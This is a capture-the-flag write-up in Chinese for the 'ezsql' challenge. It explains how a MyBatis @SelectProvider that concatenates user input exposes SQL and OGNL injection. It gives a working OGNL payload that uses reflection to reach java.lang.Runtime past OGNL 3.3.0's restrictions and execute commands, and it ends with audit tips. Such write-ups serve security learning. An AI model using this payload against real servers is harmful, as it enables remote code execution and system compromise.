# ezsql

## 题目简述

题目后端使用 MyBatis 的 `@SelectProvider` 动态生成 SQL，`VoteProvider.getVoteById()` 把用户可控的 `vid` 直接拼接进 `WHERE("v_id = " + vid)`。这个点同时暴露 SQL 注入和 MyBatis `${}` 触发的 OGNL 表达式注入，最终目标是通过 OGNL 静态方法调用实现 RCE。

OGNL 官方文档 https://commons.apache.org/proper/commons-ognl/language-guide.html 的关键点是：OGNL 支持属性访问、方法调用、静态方法和表达式求值；在 MyBatis `${...}` 这类文本替换场景中，如果用户能控制表达式内容，就能把参数绑定机制变成表达式执行入口。本题还使用较新的 OGNL 3.3.0，启用了 stricter invocation mode，对 `java.lang.Runtime` 等类做了硬编码限制，因此 payload 需要借助反射绕过。

## 解题过程

从源码可以看出: 后端使用了 mybatis, 采用 Provider 来动态生成 SQL 语句。

```
club.example.demo.dao.VoteDAO

@Mapper
public interface VoteDAO {
    @Select("SELECT * FROM vs_votes;")
    List<Vote> getAllVotes();

    @SelectProvider(type = VoteProvider.class, method = "getVoteById")
    Vote getVoteById(String vId);
}

club.example.demo.dao.VoteProvider.class

public class VoteProvider {
    public String getVoteById(@Param("vid") String vid) {
        String s = new SQL() {{
            SELECT("*");
            FROM("vs_votes");
            WHERE("v_id = " + vid);
        }}.toString();
        return s;
    }
}
```

mybatis 的 SQL 映射支持使用 OGNL 表达式，VoteProvider  直接使用字符串拼接来生成 SQL 语句，如果错误地把用户输入拼接进去，不仅会发生 SQL 注入，还会引发 OGNL 注入。

`/vote/getDetailedVoteById?vid=2`

接口正常返回 `id=2` 对应投票详情。

`/vote/getDetailedVoteById?vid=${3-1}`

把 `vid` 改成 `${3-1}` 后仍返回同一条记录，说明参数会进入 MyBatis/OGNL 表达式求值，`3-1` 被计算为 `2`。

`${xxx}` 告诉 mybatis 在此处创建一个预处理语句参数，借助 OGNL 来实现参数 SQL 语句的参数绑定。

如果用户能够控制 `${}` 中的内容，就能通过 OGNL 表达式来注入到达 RCE 的目的。

OGNL 语法参考官方文档

https://commons.apache.org/proper/commons-ognl/language-guide.html

由于题目 ban 掉了 new，所以只能借助静态方法来实现RCE。

题目里使用的 org.mybatis.spring.boot  是最新的 2.2.2 版本，对应的 OGNL 依赖的版本为 3.3.0, 高版本的 OGNL 启用了 stricter invocation mode ，使用硬编码的方式 ban 掉了一些 class, 其中就包括 java.lang.Runtime ，要 bypass  得借助反射。

payload:

```
${(#runtimeclass=#this.getClass().forName("java.lang.Runtime")).
(#getruntimemethod=#runtimeclass.getDeclaredMethods()[7]).
(#rtobj=#getruntimemethod.invoke(null,null)).
(#execmethod=#runtimeclass.getDeclaredMethods()[14]).
(#execmethod.invoke(#rtobj,"cmd"))}
```

## 方法总结

- 核心技巧：MyBatis Provider 字符串拼接导致 `${}` 可控，进一步触发 OGNL 表达式执行；高版本 OGNL 禁用部分直接调用时，用反射取类、取方法并调用。
- 识别信号：看到 `@SelectProvider`、`new SQL()` 和用户输入直接拼接到 SQL 片段时，除了 SQL 注入，还要检查 MyBatis 文本替换和 OGNL 解析路径。
- 复用要点：`#{}` 是预编译参数绑定，`${}` 是字符串替换；后者如果可控，应按模板/表达式注入思路审计。
